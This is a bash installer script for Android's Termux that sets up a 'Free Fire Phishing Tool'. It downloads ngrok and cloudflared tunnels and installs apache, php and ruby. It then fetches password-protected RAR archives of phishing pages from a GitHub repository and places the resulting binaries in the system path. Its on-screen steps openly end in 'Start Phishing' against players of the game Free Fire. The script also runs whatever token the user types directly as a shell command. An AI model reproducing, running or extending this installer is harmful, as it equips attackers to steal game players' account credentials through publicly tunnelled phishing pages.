#!/bin/bash
echo ""
clear
echo ""

logo() {
echo -e ""
echo -e "\e[33m
███████ ██████  ███████ ███████ 
██      ██   ██ ██      ██      
█████   ██████  █████   █████   
██      ██   ██ ██      ██      
██      ██   ██ ███████ ███████                                 
                                
      ███████ ██ ██████  ███████      
      ██      ██ ██   ██ ██           
      █████   ██ ██████  █████        
      ██      ██ ██   ██ ██           
      ██      ██ ██   ██ ███████      
                                       
  \e[0m\n"
}

logo2() {
echo -e ""
echo -e "\e[92m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""
  
  }
  




function setup_ngrok() {
echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Download Ngrok...\e[0m  "
	if [ ! -f  "${BIN}/ngrok" ]; then
             if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
		     ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
             elif [[ "$arch" == *'aarch64'* ]]; then
                     ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
             elif [[ "$arch" == *'x86_64'* ]]; then
                    if [[ "$ArNam" == *'amd64'* ]]; then
                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                    else
                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
                    fi
             else
                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
             fi
		launch="installing server-2, size@4mb";splashdown="Installed.";echo
		(wget --quiet $ngrok_url -O ngrok.zip)	
		unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok
        else
              echo ""
        fi
}


function setup_cloudflare() {
echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Download Cloudflared...\e[0m  "
	if [ ! -f ${BIN}/cloudflared ]; then
             if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
		     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
             elif [[ "$arch" == *'aarch64'* ]]; then
                     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
             elif [[ "$arch" == *'x86_64'* ]]; then
                    if [[ "$ArNam" == *'amd64'* ]]; then
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                    else
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                    fi
             else
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
             fi
	          launch="Installing server-1, size@25mb";splashdown="installed.";echo
	          (wget --quiet ${cloudd} -O cloudflared)& 
	          
        else 
	    echo ""
	fi
}


ngroktoken() {
echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ngrok authtoken 1Y7IU ] : \e[0m' token
$token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi
}

uninstall() {
echo -e ""
rm -rf /data/data/com.termux/files/usr/bin/ngrok
rm -rf /data/data/com.termux/files/usr/bin/cloudflared
rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/1 /data/data/com.termux/files/usr/bin/.SUMAN/2 /data/data/com.termux/files/usr/bin/.SUMAN/3 /data/data/com.termux/files/usr/bin/.SUMAN/4 /data/data/com.termux/files/usr/bin/.SUMAN/5 /data/data/com.termux/files/usr/bin/.SUMAN/6 /data/data/com.termux/files/usr/bin/.SUMAN/7 /data/data/com.termux/files/usr/bin/.SUMAN/8 /data/data/com.termux/files/usr/bin/.SUMAN/9 /data/data/com.termux/files/usr/bin/.SUMAN/0
rm -rf /data/data/com.termux/files/usr/bin/FF
rm -rf /data/data/com.termux/files/usr/bin/FreeFire
rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking
echo -e ""
}

welcome() {
echo -e ""
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
echo ""
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
sleep 5
rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
clear
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
echo""
echo""
echo ""
termux-open-url https://www.onlinehacking.in/
echo ""
clear
}



echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e "\e[33m
      ██╗  ██╗███████╗██╗   ██╗
      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
      █████╔╝ █████╗   ╚████╔╝
      ██╔═██╗ ██╔══╝    ╚██╔╝
      ██║  ██╗███████╗   ██║
      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/Free-Fire-Key  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to Continue : \e[0m' option
echo""
echo""
echo""
if [[ $option == *''* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
echo ""
termux-setup-storage
apt install apache2 -y 
apt install ruby -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
apt install unrar -y
pkg install wget -y
pkg install ruby -y
clear
echo""
logo2
echo""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
setup_ngrok
echo ""
setup_cloudflare
echo""
clear
echo ""
logo
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar -O SUMAN.rar
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN-MAX.rar -O SUMAN-MAX.rar
unrar x -Password SUMAN.rar
unrar x -Password SUMAN-MAX.rar
rm -rf SUMAN.rar
rm -rf SUMAN-MAX.rar
chmod +x ngrok
chmod +x cloudflared
chmod +x FF
chmod +x FreeFire
clear

ngroktoken

echo
cp -R cloudflared ngrok .SUMAN/1/
cp -R cloudflared ngrok .SUMAN/2/
cp -R cloudflared ngrok .SUMAN/3/
cp -R cloudflared ngrok .SUMAN/4/
cp -R cloudflared ngrok .SUMAN/5/
cp -R cloudflared ngrok .SUMAN/6/
cp -R cloudflared ngrok .SUMAN/7/
cp -R cloudflared ngrok .SUMAN/8/
cp -R cloudflared ngrok .SUMAN/9/
cp -R cloudflared ngrok .SUMAN/0/
chmod 7777 FreeFire-Phishing
clear
echo
uninstall
echo
cp -R ngrok /data/data/com.termux/files/usr/bin
cp -R cloudflared /data/data/com.termux/files/usr/bin
cp -R .SUMAN /data/data/com.termux/files/usr/bin
cp -R FF /data/data/com.termux/files/usr/bin
cp -R FreeFire /data/data/com.termux/files/usr/bin
cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
cp -R OnlineHacking /data/data/com.termux/files/usr/bin
echo
echo
logo
echo
echo -e "\e[35m[+] Connect Online Hacking FREE FIRE Hacking Server (CyberPlane)......  \e[m "
sleep 5
echo
echo
clear
logo2
echo
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
echo
echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
echo
echo
echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
echo
fi

echo
rm -rf Android-Setup.sh
sleep 3
echo
exit
